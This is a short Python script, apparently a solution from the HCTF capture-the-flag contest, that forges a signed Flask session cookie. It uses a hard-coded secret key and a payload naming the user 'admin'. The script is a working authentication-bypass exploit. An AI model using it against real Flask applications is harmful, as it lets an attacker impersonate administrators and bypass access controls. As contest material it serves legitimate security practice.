#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# File Name: decode.py
# Author: Image
# mail: malingtao1019@163.com
# Blog:http://blog.imagemlt.xyz
# Created Time: 2018年11月12日 星期一 19时11分01秒
from itsdangerous import *
from flask.sessions import *
import sys 

key='ckj123'
salt="cookie-session"
serializer=session_json_serializer
digest_method=hashlib.sha1
key_derivation='hmac'

signer_kwargs = dict(
            key_derivation=key_derivation,
            digest_method=digest_method
        )


def serialize(obj,timestamp,sep):
        my_serializer=URLSafeTimedSerializer(key,salt=salt,serializer=serializer,signer_kwargs=signer_kwargs)
        base64d=my_serializer.dump_payload(obj) #数据压缩
        data=base64d+sep+timestamp #拼接timestamp
        result=data+sep+my_serializer.make_signer(salt).get_signature(data) #拼接签名内容
        return result
if __name__=='__main__':
    # instance used in hctf
    u={u'csrf_token': '9ed1f5e068a99aacff55e2fc74960106ab1dbd3b', u'user_id': u'10', u'name': u'admin', u'image': 'Umes', u'_fresh': True, u'_id': '420596569a6a480e17e52e45526b180a06c7a41bbb6229cb803a75ff7dc5682b763dffd7742d4dd78f89ad1c6183069a2959ae237dda04551c11805111048565'}


    print serialize(u,'W-lhLA','.')
